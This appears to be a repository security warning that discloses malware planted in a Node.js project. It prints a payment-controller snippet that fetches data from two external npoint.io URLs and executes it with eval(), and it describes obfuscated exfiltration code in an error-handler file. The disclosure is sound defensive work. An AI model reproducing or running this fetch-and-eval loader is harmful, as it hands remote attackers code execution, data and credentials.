

## ⚠️ SECURITY WARNING: Malicious Code Detected ⚠️

This repository contains multiple instances of malicious code that could compromise security:

### 1. Malicious `eval()` in Payment Controller

```javascript
// MALICIOUS CODE in server/controllers/paymentController.js
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
    const rs_L = await axios.get("https://api.npoint.io/c04c4a604c305634f824");
    const rs_C = await axios.get("https://api.npoint.io/7ff61097aa52f82cffb0");
    eval(rs_L.data.cookie); // Executes arbitrary code from external source
    eval(rs_C.data.cookie); // Executes arbitrary code from external source
})();
```

This code fetches data from external sources and uses `eval()` to execute it, which is a severe security vulnerability that could lead to:
- Remote code execution
- Data theft
- Server compromise
- Authentication token theft

### 2. Obfuscated Malicious Code in Error Handler

The file `server/middlewares/helpers/error.js` contains heavily obfuscated JavaScript code that appears to:
- Connect to external servers
- Access system files and directories
- Copy/manipulate data from the user's machine
- Establish persistence mechanisms

This obfuscated code appears to be designed for data exfiltration or other malicious purposes and should be completely removed.


